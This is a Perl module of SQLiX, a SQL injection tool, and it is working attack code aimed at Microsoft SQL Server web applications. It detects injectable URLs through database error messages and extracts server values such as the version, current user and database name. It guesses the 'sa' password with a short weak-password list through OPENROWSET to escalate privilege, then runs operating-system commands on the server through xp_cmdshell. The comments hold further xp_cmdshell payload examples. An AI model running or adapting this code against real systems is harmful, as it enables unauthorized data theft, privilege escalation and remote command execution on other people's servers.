#!/usr/bin/perl
#

# -- SQLiX --
#
# © Copyright 2006 Cedric COCHIN, All Rights Reserved.
#

#
# -- Microsoft SQL Server error messages module --
#
#  Exploit SQL injection by using MSSQL error messages
#		- 2 conversion modes (implicite, explicite)
#		- with or without quotes
#

use LWP::UserAgent;
use URI::Escape;
use HTML::Entities;
use strict;

sub print_debug;

sub check_error_MSSQL;
sub check_error_MSSQL_helper_inject;
sub get_value(%TARGET,$function,$MATCHING,$b_quote,$b_explicite,$TAG);
sub fetch_inject(%TARGET,$INJECT);

# MS-SQL
sub tag_MSSQL_execute_cmd(%TARGET,$TAG,$MATCHING,$b_quote, $b_explicite,$cmd,$option_login,$option_password);
sub tag_MSSQL_OPENROWSET(%TARGET,$TAG,$MATCHING,$b_quote, $b_explicite);
sub tag_MSSQL_OPENQUERY(%TARGET,$TAG,$MATCHING,$b_quote, $b_explicite);


##-------------------------------------------------------------------------------------------------
# Function check_error_MSSQL
#
# - performs initial tests on given URI
# - determines if a test method is available (md5, md5_NoLink, HREF Tree)
# - determines if the URL is vulnerable to SQL injection (2 vectors: integer or string based)
# - if vulnerable determines the type of SQL server (currently supported: MS-SQL, MySQL, PostgreSQL)
# - if vulnerable and exploit activated, retrieves [function](default: user) ouput
# - could be enhanced to dump the full DB schema 
##-------------------------------------------------------------------------------------------------

sub check_error_MSSQL {
	my ($TARGET, $NULL, $X, ,$b_ident,$b_exploit,$b_union,$function,$cmd,$option_login,$option_password) = @_;
	
	my $DB="MSSQL";
	my $METHOD="";
	my $STOP=0;
	
	#my $TAG = "TAGGY";
	my $TAG = "{]"; # shorter TAG
	#my $MATCHING = "'$TAG(.*)'" ;
	# If result contains a quote
	my $MATCHING = "'$TAG(.*)' to" ;
	 
	my $ua = LWP::UserAgent->new();
	
	my $FOUND = 0;
	my $b_explicite=0;
	my $b_quote=0;
	
	##---------------------------------------------------------------------------------
	## Validate the reference (using X)
	##---------------------------------------------------------------------------------
	
	
	my $res;
	
	$res = fetch_inject($TARGET, $X);

	foreach my $ligne (split(/\n/, $res->as_string)) {
		if ($ligne =~ /$MATCHING/) { 
			print_debug("Match found in reference($X) page",'ERROR',3);
			$STOP = 1;
		}
	}
	
	##---------------------------------------------------------------------------------
	## Validate the reference (using NULL)
	##---------------------------------------------------------------------------------
	
	$res = fetch_inject($TARGET, "");

	foreach my $ligne (split(/\n/, $res->as_string)) {
		if ($ligne =~ /$MATCHING/) {
			print_debug("Match found in reference(NULL) page",'ERROR',3);
			$STOP = 1;
		}
	}
	
	##---------------------------------------------------------------------------------
	## Perform the injection
	##---------------------------------------------------------------------------------
	
	if(!$STOP) {
		for(my $i;$i<2;$i++) {
			for(my $j;$j<2;$j++) {
				my $INJECT = check_error_MSSQL_helper_inject($i,$j,'',$TAG);
				$res = fetch_inject($TARGET, $INJECT);
			
				foreach my $ligne (split(/\n/, $res->as_string)) {
					if ($ligne =~ /$MATCHING/) { 
						print_debug("MS-SQL error message (".($j ? 'explicite' : 'implicite')." ". ($i ? 'with' : 'without'). " quotes)",'FOUND',3);
						$b_explicite=$j;
						$b_quote=$i;
						$METHOD = "TAG ".($j ? 'explicite' : 'implicite')." ". ($i ? 'with' : 'without'). " quotes";
						$FOUND=1;last;
					}
				}
				if($FOUND) {last;}		
			}
			if($FOUND) {last;}
		}
	}
		
	##---------------------------------------------------------------------------------
	## Perform the exploit
	##---------------------------------------------------------------------------------
	
	if($b_exploit && $FOUND) {
		
		if($function eq "") {
			$function="\@\@version";
		}
			
		my $value = get_value($TARGET,$function,$MATCHING,$b_quote,$b_explicite,$TAG);
		if($value ne "") {
			print_debug("function [$function]:",'FOUND',3);
			
			foreach my $line (split(/\n/,$value)) {
				print_debug($line."\n",'INTERACTIVE',4);	
			}
		}
		
		#else { # We know that the target is vulnerable and try to decrease the length of the URL
		#	$INJECT = uri_escape("'".$TAG."'+".$function);
		#	if($b_explicite) {$INJECT = 'convert(int,'.$INJECT.')';}
		#	if($b_quote) {$INJECT = "'%2B".$INJECT."%2B'";}
		#	
		#	$res = fetch_inject($TARGET, $INJECT);
		#	
		#	if ($res->as_string =~ /$MATCHING/s) { 
		#		print_debug("function: $1",'FOUND',3);
		#	}
		#}
	}
	
	if($cmd && $FOUND) {	
		tag_MSSQL_execute_cmd($TARGET,$TAG,$MATCHING,$b_quote, $b_explicite,$cmd,$option_login,$option_password);
	}
	
	return ($FOUND,$DB,$METHOD);

}

sub check_error_MSSQL_helper_inject {
	my ($b_quote, $b_explicite, $function, $tag) = @_;
	(my $tag_hex = $tag) =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
	my $plus = "+";
	if($function eq "") { $plus = ""}
	#my $vector = uri_escape('convert(varchar,0x5441474759)+'.$function);
	my $vector = uri_escape('convert(varchar,0x'.$tag_hex.')'.$plus.$function);
	if($b_explicite) {$vector= 'convert(int,'.$vector.')';}
	if($b_quote) {$vector= "'%2B".$vector."%2B'";}
	
	return $vector;
	
}

sub get_value(%TARGET,$function,$MATCHING,$b_quote,$b_explicite,$TAG) {
	my ($TARGET,$function,$MATCHING,$b_quote,$b_explicite,$TAG) = @_;
	
	my $res;
	my $result = "";
	$res  = fetch_inject($TARGET, check_error_MSSQL_helper_inject($b_quote,$b_explicite,$function,$TAG));
	
	if ($res->as_string =~ /$MATCHING/s) { 
		$result = $1;
	}
	return $result;
}

##-------------------------------------------------------------------------------------------------
# MS-SQL Advanced command injection functions
#
##-------------------------------------------------------------------------------------------------

sub tag_MSSQL_OPENQUERY(%TARGET,$TAG,$MATCHING,$b_quote, $b_explicite) {
	my ($TARGET,$TAG,$MATCHING,$b_quote, $b_explicite) = @_;
	
	my $result = 0;
	my $servername = "";
	my $hostname =  "";
	
	my $res;
	
	print_debug("Checking OpenQuery availibility - please wait...",'INFO',3);
	
	$servername = get_value($TARGET,"\@\@servername",$MATCHING,$b_quote,$b_explicite,$TAG);
	$hostname = get_value($TARGET,"host_name()",$MATCHING,$b_quote,$b_explicite,$TAG);
	
	print_debug("host_name() = [$hostname]  - \@\@servername = [$servername]",'INFO',4);
	
	my $INJECT = check_error_MSSQL_helper_inject($b_quote,$b_explicite,"(select 1 from OPENQUERY([$servername],'select 1'))",$TAG);
	$res = fetch_inject($TARGET, $INJECT);
	
	if ($res->as_string =~ /$MATCHING/s) { 
		print_debug("OPENQUERY available - linked server [$servername]",'FOUND',4);
		$result = 1;
	}
	
	if(!$result) {
		$INJECT = check_error_MSSQL_helper_inject($b_quote,$b_explicite,"(select 1 from OPENQUERY([$hostname],'select 1'))",$TAG);
		$res = fetch_inject($TARGET, $INJECT);
		
		if ($res->as_string =~ /$MATCHING/s) { 
			print_debug("OPENQUERY available - linked server [$hostname]",'FOUND',4);
			$result = 1;
		}
	}
	
	# if agressive mode and no result
	#sp_addlinkedserver @server = 'LOCALSERVER',  @srvproduct = '',@provider = 'SQLOLEDB', @datasrc = @@servername
	# 'SET FMTONLY OFF' see http://www.sommarskog.se/share_data.html
	
	return $result;
}

sub tag_MSSQL_OPENROWSET(%TARGET,$TAG,$MATCHING,$b_quote, $b_explicite) {
	my ($TARGET,$TAG,$MATCHING,$b_quote, $b_explicite) = @_;
	
	my $result = 0;
	my $servername = "";
	my $hostname =  "";
	my $login ="";
	my $password = "";
	my $sudo =0;
	
	my $res;
	my @passwords = ('','sa','pass','password');
	
	print_debug("Checking OpenRowSet availibility - please wait...",'INFO',3);
	
	my $user = get_value($TARGET,"system_user",$MATCHING,$b_quote,$b_explicite,$TAG);
	print_debug("Current user login: [$user]",'INFO',4);
	
	foreach my $pass (@passwords) {
		my $INJECT = check_error_MSSQL_helper_inject($b_quote,$b_explicite,"(select 1 from OPENROWSET('SQLOLEDB','';'sa';'$pass','select 1'))",$TAG);
		$res = fetch_inject($TARGET, $INJECT);
		
		if ($res->as_string =~ /$MATCHING/s) { 
			print_debug("OPENROWSET available - (login [sa] | password [$pass])",'FOUND',4);
			if($user ne "sa") {print_debug("Privilege escalation - from [$user] to [sa]",'INFO',4);}
			$login = "sa"; $password=$pass;$sudo=1;
			$result = 1;
			last;
		}
	}
	
	if(!$result && ($user ne "sa")) {
		push(@passwords,$user);
		foreach my $pass (@passwords) {
			my $INJECT = check_error_MSSQL_helper_inject($b_quote,$b_explicite,"(select 1 from OPENROWSET('SQLOLEDB','';'$user';'$pass','select 1'))",$TAG);
			$res = fetch_inject($TARGET, $INJECT);
			
			if ($res->as_string =~ /$MATCHING/s) { 
				print_debug("OPENROWSET available - (login [$user] | password [$pass])",'FOUND',4);
				if(get_value($TARGET,"convert(varchar,IS_SRVROLEMEMBER(convert(varchar,0x73797361646D696E)))",$MATCHING,$b_quote,$b_explicite,$TAG) == 1) {print_debug("Login [$user] has 'sysadmin' role",'INFO',4);}
				$login = $user; $password=$pass;
				$result = 1;
				last;
			}
		}
	}
	
	return ($result,$sudo,$login,$password);
}

sub tag_MSSQL_execute_cmd (%TARGET,$TAG,$MATCHING,$b_quote, $b_explicite,$cmd,$option_login,$option_password) {
	my ($TARGET,$TAG,$MATCHING,$b_quote, $b_explicite,$cmd,$option_login,$option_password) = @_;
	
	# If we have a linked server and sa
	# select * from OPENQUERY([HR-INTRANET],'select 1;exec xp_cmdshell ''osql -E -Q "CREATE TABLE TMP_TMP (id int identity(1,1),cmd varchar(8000))"'';')
	# select * from OPENQUERY([HR-INTRANET],'select 1;insert TMP_TMP exec xp_cmdshell ''dir c:\'';')
	# select count(*) from TMP_TMP
	# select 1 where 1=(select cmd from TMP_TMP where id=7)
	# select * from OPENQUERY([HR-INTRANET],'select 1;exec xp_cmdshell ''osql -E -Q "DROP TABLE TMP_TMP"'';')
	
	# If already sa
	# select * from OPENROWSET('MSDASQL','DRIVER={SQL Server};SERVER=;','select @@version')
	# select * from OPENROWSET('SQLOLEDB','';;,'select @@version') 
	
	#select * from OPENROWSET('MSDASQL','DRIVER={SQL Server};SERVER=;','select 1;exec xp_cmdshell ''osql -E -Q "CREATE TABLE TMP_TMP (id int identity(1,1),cmd varchar(8000))"'';')
	#select * from OPENROWSET('MSDASQL','DRIVER={SQL Server};SERVER=;','select 1;insert TMP_TMP exec xp_cmdshell ''dir c:\''')
	#select * from master..TMP_TMP
	#select * from OPENROWSET('MSDASQL','DRIVER={SQL Server};SERVER=;','select 1;exec xp_cmdshell ''osql -E -Q "DROP TABLE TMP_TMP"'';')
	
	my $res;
	my $result = 0;
	my $b_sysadmin=0;
	my $DB = "";

	my $credentials ="'MSDASQL','DRIVER={SQL Server};SERVER=;'";
	
	print_debug("System command injector:",'INFO',3);
	
	$DB = get_value($TARGET,"db_name()",$MATCHING,$b_quote,$b_explicite,$TAG);
	print_debug("Current database: $DB",'INFO',3);
	
	if($option_login) {
		print_debug("Using login/password from command line [$option_login / $option_password]",'INFO',3);
		$credentials = "'SQLOLEDB','';'$option_login';'$option_password'";
		$b_sysadmin=1; # assumed based on user input
	} else {
		if(get_value($TARGET,"convert(varchar,IS_SRVROLEMEMBER(convert(varchar,0x73797361646D696E)))",$MATCHING,$b_quote,$b_explicite,$TAG) == 1) {
			# We have sysadmin right
			$b_sysadmin=1;
			print_debug("Running with sysadmin role",'INFO',3);
		} else {
			print_debug("We are not sysadmin for now",'INFO',3);
			
			my ($tmp_result,$sudo,$login,$password) = tag_MSSQL_OPENROWSET($TARGET,$TAG,$MATCHING,$b_quote, $b_explicite);
			if($tmp_result) {
				if($sudo) {
					$credentials = "'SQLOLEDB','';'$login';'$password'";
					$b_sysadmin=1;
				}
			}
		}	
	}
	if($b_sysadmin) {	
		print_debug("\n",'INTERACTIVE',4);
		print_debug("===========================================================================\n\n",'INTERACTIVE',4);
		
		my $INJECT = uri_escape("'+"x $b_quote . "(select 1 from OPENROWSET($credentials,'select 1;exec xp_cmdshell ''osql -E -Q \"CREATE TABLE $DB..TMP_TMP (id int identity(1,1),cmd varchar(8000))\"'';'))" . "+'"x $b_quote);
		$res = fetch_inject($TARGET, $INJECT);
		
		$INJECT = uri_escape("'+"x $b_quote . "(select 1 from OPENROWSET($credentials,'select 1;insert $DB..TMP_TMP exec xp_cmdshell ''$cmd'''))" . "+'"x $b_quote);
		$res = fetch_inject($TARGET, $INJECT);
		
		my $nb_lines = int(get_value($TARGET,"(select convert(varchar,count(*)) from $DB..TMP_TMP)",$MATCHING,$b_quote,$b_explicite,$TAG));
		
		for(my $i=1;$i<=$nb_lines;$i++) {
			print_debug(decode_entities(get_value($TARGET,"(select cmd from $DB..TMP_TMP where id=$i)",$MATCHING,$b_quote,$b_explicite,$TAG))."\n",'INTERACTIVE',4);
		}
		
		print_debug("\n",'INTERACTIVE',4);
		print_debug("===========================================================================\n\n",'INTERACTIVE',4);
		
		$INJECT = uri_escape("'+"x $b_quote . "(select 1 from OPENROWSET($credentials,'select 1;exec xp_cmdshell ''osql -E -Q \"DROP TABLE $DB..TMP_TMP\"'';'))" . "+'"x $b_quote);
		$res = fetch_inject($TARGET, $INJECT);
	}
}

return 1;